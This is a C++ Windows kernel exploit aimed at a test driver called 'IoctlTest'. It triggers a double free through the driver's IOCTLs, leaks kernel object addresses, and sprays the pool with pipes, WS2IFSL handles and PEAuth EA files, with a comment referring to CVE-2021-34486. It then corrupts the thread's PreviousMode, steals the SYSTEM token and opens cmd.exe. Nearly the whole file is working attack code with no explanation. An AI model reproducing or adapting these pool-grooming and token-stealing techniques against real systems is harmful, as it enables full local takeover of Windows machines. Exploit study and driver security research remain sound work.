#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "ntdll")

// Device 
#define DEVICE            L"\\\\.\\IoctlTest"
#define IOCTL_ALLOCATE32  0x9C402400
#define IOCTL_RELEASE32   0x9C402408
#define IOCTL_ALLOCATE64  0x9C402404
#define IOCTL_RELEASE64   0x9C40240C

HANDLE g_hDevice;

VOID Allocate64(ULONG uSize)
{
	//wprintf(L"[+] Allocate64\r\n");
	BYTE szInbuffer[4] = { 0 };
	BYTE szOutBuffer[12] = { 0 };
	*(PULONG)szInbuffer = uSize;
	DWORD dwBytesReturned;
	BOOL ret = FALSE;
	ret = DeviceIoControl(
		g_hDevice, 
		IOCTL_ALLOCATE64, 
		szInbuffer, sizeof(szInbuffer), 
		szOutBuffer, sizeof(szOutBuffer), 
		&dwBytesReturned, NULL);
	if (FALSE == ret)
	{
		wprintf(L"[-] Error IOCTL_ALLOCATE64\r\n");
		exit(1);
	}
}

VOID Allocate32(ULONG uSize)
{
	//wprintf(L"[+] Allocate32\r\n");
	BYTE szInbuffer[4] = { 0 };
	BYTE szOutBuffer[8] = { 0 };
	*(PULONG)szInbuffer = uSize;
	DWORD dwBytesReturned;
	BOOL ret = FALSE;
	ret = DeviceIoControl(
		g_hDevice,
		IOCTL_ALLOCATE32,
		szInbuffer, sizeof(szInbuffer),
		szOutBuffer, sizeof(szOutBuffer),
		&dwBytesReturned, NULL);
	if (FALSE == ret)
	{
		wprintf(L"[-] Error IOCTL_ALLOCATE32\r\n");
		exit(1);
	}
}

//if (!ulInputBufferLength || !ulOutputBufferLength)
//{
//	v3 = 0xC000000D;
//	goto LABEL_34;
//}
VOID Free64()
{
	//wprintf(L"[+] Free64\r\n");
	BYTE buffer[] = "h5";
	BOOL ret = FALSE;
	DWORD dwBytesReturned = 0;
	ret = DeviceIoControl(
		 g_hDevice, 
		IOCTL_RELEASE64, 
		buffer, sizeof(buffer), 
		buffer, sizeof(buffer), 
		&dwBytesReturned, NULL);
	if (FALSE == ret)
	{
		wprintf(L"Error IOCTL_RELEASE64\r\n");
		exit(1);
	};

	// wprintf(L"first free succeeded, dwOutput = %d\n", dwOutput);
}

VOID Free32()
{
	//wprintf(L"[+] Free32\r\n");
	BYTE buffer[] = "h5";
	BOOL ret = FALSE;
	DWORD dwBytesReturned = 0;
	ret = DeviceIoControl(
		g_hDevice,
		IOCTL_RELEASE32,
		buffer, sizeof(buffer),
		buffer, sizeof(buffer),
		&dwBytesReturned, NULL);
	if (FALSE == ret)
	{
		wprintf(L"Error IOCTL_RELEASE32\r\n");
		exit(1);
	};
}

// Get Kernel Infomation
ULONG64   g_SystemEprocess;
ULONG64   g_CurrentEprocess;
ULONG64   g_ExploitEthread;

HANDLE    g_ThreadExploitHandle;
DWORD     g_CurrentPid;

// NtQuerySystemInfomation Leak Information
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
	LONG __PADDING__[1];
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;



#define SystemModuleInformation			(SYSTEM_INFORMATION_CLASS)0x0b
#define SystemHandleInformation			(SYSTEM_INFORMATION_CLASS)0x10
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)

VOID LeakByQuerySystemInfomation() 
{
	DWORD CurPid = GetCurrentProcessId();
	g_CurrentPid = CurPid;
	// Process
	HANDLE hSelf = OpenProcess(PROCESS_QUERY_INFORMATION, 0, CurPid);
	if (hSelf == INVALID_HANDLE_VALUE || hSelf == NULL) 
	{
		wprintf(L"[-] Error OpenProcess\r\n");
		exit(1);
	}

	// kthread and ktoken
	PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(0x100);
	ULONG OutBufLen = 0;
	NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, HandleInfo, 0x100, &OutBufLen);
	if (status == STATUS_INFO_LENGTH_MISMATCH) 
	{
		free(HandleInfo);
		HandleInfo = (SYSTEM_HANDLE_INFORMATION*)malloc(OutBufLen);
		status = NtQuerySystemInformation(SystemHandleInformation, HandleInfo, OutBufLen, &OutBufLen);
	}

	if (HandleInfo == NULL) 
	{
		wprintf(L"[-] Error NtQuerySystemInformation SystemHandleInformation\r\n");
		exit(1);
	}

	// PID 当前进程 Handle 没有指定
	for (int i = 0; i < HandleInfo->NumberOfHandles; i++)
	{
		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo->Handles[i];
		if (handleInfo.UniqueProcessId == CurPid)
		{
			wprintf(L"[*] PID %d\tObject %#llx\n", handleInfo.UniqueProcessId, (ULONG64)handleInfo.Object);
			break;
		}
	}

	// 找到 ExploitThread 的ETHREAD
	// 找到System的 EPROCESS
	// 找到当前进程的 EPROCESS
	for (ULONG i = 0; i < HandleInfo->NumberOfHandles; i++) 
	{
		SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleEntry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo->Handles[i];
		if (HandleEntry.UniqueProcessId == CurPid && HandleEntry.HandleValue == (ULONG)g_ThreadExploitHandle)
		{
			g_ExploitEthread = (ULONG64)HandleEntry.Object;
			wprintf(L"[*] Exploit thread PID: %d\thandle: %#x\t_KTHREAD: %#llx\n", HandleEntry.UniqueProcessId, HandleEntry.HandleValue, g_ExploitEthread);
		}

		// 当前进程 Eprocess
		if (HandleEntry.UniqueProcessId == CurPid && HandleEntry.HandleValue == (ULONG)hSelf) 
		{
			g_CurrentEprocess = (ULONG64)HandleEntry.Object;
			wprintf(L"[*] Current PID: %d\thandle: %#x\t_EPROCESS: %#llx\n", HandleEntry.UniqueProcessId, (ULONG)hSelf, g_CurrentEprocess);
		}

		// System 进程 Eprocess
		if (HandleEntry.UniqueProcessId == 0x4 && HandleEntry.HandleValue == 0x4) 
		{ // SYSTEM Process has a handle to itself
			g_SystemEprocess = (ULONG64)HandleEntry.Object;
			wprintf(L"[*] System _EPROCESS: 0x%llx\r\n", g_SystemEprocess);
		}

		if (g_ExploitEthread != 0 && g_CurrentEprocess != 0 && g_SystemEprocess) 
		{
			free(HandleInfo);
			break;
		}
	}
	// Get kthread and ktoken
	if (g_ExploitEthread == 0 || g_CurrentEprocess == 0 || g_SystemEprocess == 0)
	{
		wprintf(L"[-] Error Leak\n");
		exit(1);
	}
}


// ws2ifsl
// wdm.h
// 结构提供扩展属性 (EA) 信息
typedef struct _FILE_FULL_EA_INFORMATION
{
	ULONG NextEntryOffset;
	UCHAR Flags;
	UCHAR EaNameLength;
	USHORT EaValueLength;
	CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;

typedef struct _PROC_DATA
{
	HANDLE ApcThread;          // 0x00
	PVOID RequestQueueRoutine; // 0x04
	PVOID CancelQueueRoutine;  // 0x08
	PVOID ApcContext;          // 0x0C
	PVOID unknown3;            // 0x10
} PROC_DATA, * PPROC_DATA;

HANDLE g_ThreadApcHandle;

// Spray Ws2P
const ULONG64 CountSprayWs2P      = 0x100;

// spray NpFr
const ULONG64 CountSprayPipe      = 0x100;

// Spray tag IO
const ULONG64 CountSprayEaFile    = 0x1000;

// set to cpu number later
DWORD CountConcurrentSprayEaFile  = 0x0;

const ULONG64 CountSprayMm        = 0x1000;

// Ws2P Process
HANDLE* g_ProcessList;

// 
HANDLE CreateProcessFileHandle(HANDLE hThreadApc)
{
	UNICODE_STRING deviceName;
	RtlInitUnicodeString(&deviceName, (PWSTR)L"\\Device\\WS2IFSL\\NifsPvd");

	OBJECT_ATTRIBUTES object;
	InitializeObjectAttributes(&object, &deviceName, 0, NULL, NULL);

	PFILE_FULL_EA_INFORMATION pFileEa =
		(PFILE_FULL_EA_INFORMATION)malloc(sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA));

	if (pFileEa == NULL)
	{
		wprintf(L"Error malloc\r\n");
		exit(1);
	}

	pFileEa->NextEntryOffset = 0;
	pFileEa->Flags = 0;
	pFileEa->EaNameLength = sizeof("NifsPvd") - 1;
	pFileEa->EaValueLength = sizeof(PROC_DATA);
	memcpy(pFileEa->EaName, "NifsPvd", pFileEa->EaNameLength + 1);

	PPROC_DATA pProcData = (PPROC_DATA)((char*)pFileEa + sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") - 4);
	pProcData->ApcThread = hThreadApc;
	pProcData->RequestQueueRoutine = (PVOID)0xaaaaaaaa;
	pProcData->CancelQueueRoutine = (PVOID)0xbbbbbbbb;
	pProcData->ApcContext = (PVOID)0xcccccccc;
	pProcData->unknown3 = (PVOID)0xdddddddd;

	HANDLE handle = INVALID_HANDLE_VALUE;
	IO_STATUS_BLOCK IoStatusBlock;

	// object -> handle
	NTSTATUS status = NtCreateFile(
		&handle, 
		MAXIMUM_ALLOWED, 
		&object, 
		&IoStatusBlock, 
		NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, 
		0,
		pFileEa,
		sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA)
	);
	if (NT_ERROR(status))
	{
		wprintf(L"[-] Error NtCreateFile\r\n");
		free(pFileEa);
		exit(1);
	}
	free(pFileEa);
	return handle;
}


// Io Pool
DWORD WINAPI APCThread(LPVOID lparam)
{
	while (1)
	{
		Sleep(0x100);
	}
}

// NpFr
typedef struct _PIPE_HANDLES {
	HANDLE r;
	HANDLE w;
} PIPE_HANDLES;

std::vector<PIPE_HANDLES> g_Pipe;

VOID SprayPipe(ULONG size)
{
	wprintf(L"[*] Spray NpFr begin...\r\n");
	ULONG payloadSize = size - 0x40;
	for (int i = 0; i < CountSprayPipe; i++)
	{
		PIPE_HANDLES pipe;
		UCHAR* payload = (UCHAR*)malloc(payloadSize);
		if (payload == NULL) {
			wprintf(L"malloc failed, err: %d\n", GetLastError());
			exit(1);
		}
		memset(payload, 'p', payloadSize);
		BOOL res = CreatePipe(&pipe.r, &pipe.w, NULL, payloadSize);
		if (res == FALSE)
		{
			wprintf(L"[-] Error CreatePipe\r\n");
			exit(1);
		}

		DWORD resultLength;
		// res = WriteFile(writePipe, payload, sizeof(payload), &resultLength, NULL);
		res = WriteFile(pipe.w, payload, payloadSize, &resultLength, NULL);
		if (res == FALSE)
		{
			wprintf(L"Error WriteFile\r\n");
			exit(1);
		}
		g_Pipe.push_back(pipe);
	}
	wprintf(L"[*] Spray NpFr done!\n");
}

typedef NTSTATUS(WINAPI* PNtSetEaFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG);
PNtSetEaFile NtSetEaFile;

HANDLE Setup()
{
	g_hDevice = CreateFileW(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == g_hDevice)
	{
		wprintf(L"[-] Error CreateFileW DEVICE\r\n");
		exit(1);
	}
	// wprintf(L"Open device %s succeeded, handle: %p\n", DEVICE, ghDev);

	g_ThreadApcHandle = CreateThread(NULL, 0, APCThread, NULL, 0, 0);
	if (g_ThreadApcHandle == INVALID_HANDLE_VALUE)
	{
		wprintf(L"[-] Error CreateThread\r\n");
		exit(1);
	}

	g_ProcessList = (HANDLE*)malloc(sizeof(HANDLE) * CountSprayWs2P);
	if (g_ProcessList == NULL)
	{
		wprintf(L"[-] Error malloc g_ProcessList\r\n");
		exit(1);
	}
	RtlFillMemory(g_ProcessList, sizeof(HANDLE) * CountSprayWs2P, 0xff);

	NtSetEaFile = (PNtSetEaFile)::GetProcAddress(::LoadLibraryW(L"ntdll.dll"), "NtSetEaFile");
	if (NtSetEaFile == NULL)
	{
		wprintf(L"[-] Error GetProcAddress(NtSetEaFile)\r\n");
		exit(1);
	}
}


// Io
// 通过 payloadSize 可以控制chunk的大小
typedef struct
{
	HANDLE hPEAuth;
	UCHAR* payload;
	ULONG PayloadSize;
} ParamSprayEaFile;

HANDLE* g_EaThreadList;

DWORD WINAPI ThreadSprayEaFile(LPVOID param)
{
	ParamSprayEaFile* _param = (ParamSprayEaFile*)param;
	IO_STATUS_BLOCK iostatus;
	for (int i = 0; i < CountSprayEaFile; i++)
	{
		NtSetEaFile(_param->hPEAuth, &iostatus, _param->payload, _param->PayloadSize);
	}
	return 0;
}

// EaFile => Io
// 详情：CVE-2021-34486
void SprayEaFile(ULONG size)
{
	// 首先得获得核心数
	// SYSTEM_INFO SystemInfo;
	// GetSystemInfo(&SystemInfo);
	// GetNativeSystemInfo(&SystemInfo);
	// CountConcurrentSprayEaFile = SystemInfo.dwNumberOfProcessors;
	CountConcurrentSprayEaFile = 2;

	wprintf(L"[*] Spray Io ...\r\n");
	ParamSprayEaFile* param = (ParamSprayEaFile*)malloc(sizeof(ParamSprayEaFile));
	if (param == NULL)
	{
		wprintf(L"[-] Error malloc ParamSprayEaFile\r\n");
		exit(1);
	}

	param->PayloadSize = size - 0x10;
	param->hPEAuth = CreateFileW(L"\\\\.\\PEAuth", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL);
	if (param->hPEAuth == INVALID_HANDLE_VALUE)
	{
		wprintf(L"[-] Error CreateFile PEAuth \r\n");
		exit(1);
	}

	param->payload = (UCHAR*)malloc(param->PayloadSize);
	if (param->payload == NULL)
	{
		wprintf(L"[-] Error malloc payload\r\n");
		exit(1);
	}
	RtlFillMemory(param->payload, param->PayloadSize, 'H');

	// fake ProcessContext
	*(ULONG32*)(&param->payload[0x0]) = 0x636F7250; // Proc
	// FsContext->RequestAPC.Thread ; _ETHREAD._KTHREAD.PreviousMode
	// !!!!! Attation + 0x30
	*(ULONG64*)(&param->payload[0x38]) = g_ExploitEthread + 0x232 + 0x30; 
	// fake ProcessContext

	g_EaThreadList = (HANDLE*)malloc(sizeof(HANDLE) * CountConcurrentSprayEaFile);
	if (g_EaThreadList == NULL)
	{
		wprintf(L"[-] Error malloc g_EaThreadList\r\n");
		exit(1);
	}
	for (unsigned int i = 0; i < CountConcurrentSprayEaFile; i++)
	{
		g_EaThreadList[i] = CreateThread(0, 0, ThreadSprayEaFile, param, CREATE_SUSPENDED, 0);
		if (g_EaThreadList[i] == NULL)
		{
			wprintf(L"[-] Error CreateThread ThreadSprayEaFile\r\n");
			exit(1);
		}

		// 为指定线程设置处理器关联掩码
		if (SetThreadAffinityMask(g_EaThreadList[i], 1 << i) == 0)
		{
			wprintf(L"[-] Error SetThreadAffinityMask\r\n");
			exit(1);
		}
	}

	for (unsigned int i = 0; i < CountConcurrentSprayEaFile; i++)
	{
		// 递减线程的挂起计数。 当暂停计数减为零时，将恢复线程的执行
		ResumeThread(g_EaThreadList[i]);
	}

	// 等待，直到一个或所有指定对象处于信号状态或超时间隔已过。
	WaitForMultipleObjects(CountConcurrentSprayEaFile, g_EaThreadList, TRUE, INFINITE);

	for (unsigned int i = 0; i < CountConcurrentSprayEaFile; i++)
	{
		CloseHandle(g_EaThreadList[i]);
	}
	CloseHandle(param->hPEAuth);
	free(param->payload);
	free(param);

	wprintf(L"[*] Spray Io done\r\n");
}


VOID Cleanup()
{
	wprintf(L"[+] cleanup...\r\n");
	
	CloseHandle(g_hDevice);

	if (g_Pipe.size() != 0)
	{
		for (PIPE_HANDLES p : g_Pipe)
		{
			CloseHandle(p.r);
			CloseHandle(p.w);
		}
	}
}

typedef NTSTATUS (NTAPI *PNtReadVirtualMemory) (
	_In_ HANDLE ProcessHandle,
	_In_opt_ PVOID BaseAddress,
	_Out_writes_bytes_(BufferSize) PVOID Buffer,
	_In_ ULONG BufferSize,
	_Out_opt_ PULONG NumberOfBytesRead
);

typedef NTSTATUS(WINAPI* PNtWriteVirtualMemory) (
	_In_ HANDLE ProcessHandle,
	_In_ PVOID BaseAddress,
	_In_ PVOID Buffer,
	_In_ ULONG NumberOfBytesToWrite,
	_Out_opt_ PULONG NumberOfBytesWritten
	);


int wmain()
{
	atexit(Cleanup);
	wprintf(L"[+] Setup ...\r\n");
	Setup();
	g_ThreadExploitHandle = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
	wprintf(L"[*] Hacking thread: %#llx\r\n", (ULONG64)GetCurrentThreadId());
	
	wprintf(L"[+] LeakByQuerySystemInfomation\r\n");
	LeakByQuerySystemInfomation();
	//std::cin.get();
	Sleep(3000);

	wprintf(L"[+] Defragment \r\n");
	for (int i = 0; i < 100; i++) 
	{
		Allocate32(0x1b000);
	}
	SprayPipe(0x120);

	wprintf(L"[+] Allocate target \r\n");
	Allocate64(0x1b000);
	wprintf(L"[+] Free first \r\n");
	Free64();                            
	

	wprintf(L"[+] Ws2P => Mdl \r\n");
	for (int i = 0; i < CountSprayWs2P; i++) 
	{
		g_ProcessList[i] = CreateProcessFileHandle(g_ThreadApcHandle);
	}
	//std::cin.get();

	wprintf(L"[+] Allocate Memory avoid crash \r\n");
	for (int i = 0; i < CountSprayMm; i++) 
	{
		Allocate32(0x1b000);
	}
	

	wprintf(L"[+] Double free \r\n");
	Free64();           

	wprintf(L"[+] Eafile => Ws2P \r\n");
	SprayEaFile(0x120);
	//std::cin.get();

	// 找了一天的 BUG
	wprintf(L"[+] Close Ws2P Process Handle \r\n");
	for (int i = 0; i < CountSprayWs2P; i++)
	{
		CloseHandle(g_ProcessList[i]);
	}

	//DWORD dwBytesWriten;
	wprintf(L"[+] Exploiting... \r\n");
	wprintf(L"[*] Exploit thread: %#lx \r\n", GetCurrentThreadId());
	//WriteFile(sync.w, "Y", 1, &dwBytesWriten, NULL);

	HANDLE hCur = GetCurrentProcess();
	//std::cin.get();
	Sleep(1000);
	//std::cin.get();

	// 需要确保 _KTHREAD.PreviousMode为0
	PNtWriteVirtualMemory NtWriteVirtualMemory = (PNtWriteVirtualMemory)::GetProcAddress(::LoadLibraryW(L"ntdll.dll"), "NtWriteVirtualMemory");
	if (NULL == NtWriteVirtualMemory)
	{
		wprintf(L"[-] Error GetProcAddress NtWriteVirtualMemory\r\n");
		exit(1);
	}
	//PNtReadVirtualMemory NtReadVirtualMemory = (PNtReadVirtualMemory)::GetProcAddress(::LoadLibraryW(L"ntdll.dll"), "NtReadVirtualMemory");
	//if (NULL == NtWriteVirtualMemory)
	//{
	//	wprintf(L"[-] Error GetProcAddress NtReadVirtualMemory\r\n");
	//	exit(1);
	// }

	// Write EPROCESS token => SYSTEM
	wprintf(L"[+] Read System token ...\r\n");
	Sleep(3000);
	ULONG BytesWritten = 0;
	ULONG64 Token[] = { 0, 0, 0, 0 };
	// addr => buffer
	NtWriteVirtualMemory(
		hCur,
		&Token,
		(PVOID)(g_SystemEprocess + 0x4b8 - 0x10), //   +0x4b8 Token
		sizeof(Token),
		&BytesWritten);
	wprintf(L"[*] Read System token: %#llx %#llx %#llx %#llx\n", Token[0], Token[1], Token[2], Token[3]);
	if (BytesWritten == 0)
	{
		wprintf(L"[-] Error read token, please reboot...\n");
		exit(1);
	}
	//std::cin.get();

	// buffer => address
	NtWriteVirtualMemory(
		hCur,
		(PVOID)(g_CurrentEprocess + 0x4b8),
		&Token[2],
		8,
		&BytesWritten
	);

	// write back PreviousMode => 1
	wprintf(L"[+] Write PrevoiuaMode 1\r\n");
	Sleep(2000);
	BYTE PreviousMode = 1;
	if (NtWriteVirtualMemory(
		hCur,
		(PVOID)(g_ExploitEthread + 0x232),
		&PreviousMode,
		1,
		&BytesWritten
	))
	{
		wprintf(L"[-] Error NtWriteVirtualMemory\r\n");
		exit(1);
	}

	wprintf(L"[+] Get shell... \r\n");
	system("cmd.exe");
	return EXIT_SUCCESS;
}